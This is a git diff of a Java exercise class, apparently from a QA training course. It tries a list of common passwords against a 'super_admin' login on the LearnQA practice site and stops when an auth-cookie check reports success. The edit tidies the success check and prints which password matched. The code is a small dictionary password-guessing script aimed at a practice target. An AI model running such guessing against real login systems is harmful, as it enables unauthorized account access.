@@ -16,7 +16,6 @@ public class ex9 {
                 "password", "123456", "12345678", "qwerty", "abc123", "monkey", "123456789", "1234567", "letmein", "trustno1", "iloveyou", "dragon", "baseball", "adobe123[a]", "123123", "welcome", "admin", "1234567890", "solo", "master", "sunshine", "photoshop[a]", "ashley", "mustang", "bailey", "passw0rd", "shadow", "121212", "football", "michael", "654321", "jesus", "superman", "princess", "696969", "qazwsx", "ninja", "azerty", "loveme", "password1", "000000", "starwars"
         );
 
-        String response;
         for (String password : passwordsList) {
             Map<String, String> data = new HashMap<>();
             data.put("login", "super_admin");
@@ -45,12 +44,11 @@ public class ex9 {
                     .when()
                     .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie");
 
-            response = responseStatus.print();
-
-            if (response.equals("You are authorized")) {
+            if (responseStatus.getBody().asString().equals("You are authorized")) {
+                System.out.println("Found correct password: " + password);
                 break;
-            } else {
-                System.out.println("CHECK YOUR DATA!");
+            }else{
+                System.out.println("Not correct password: " + password);
             }
         }
     }
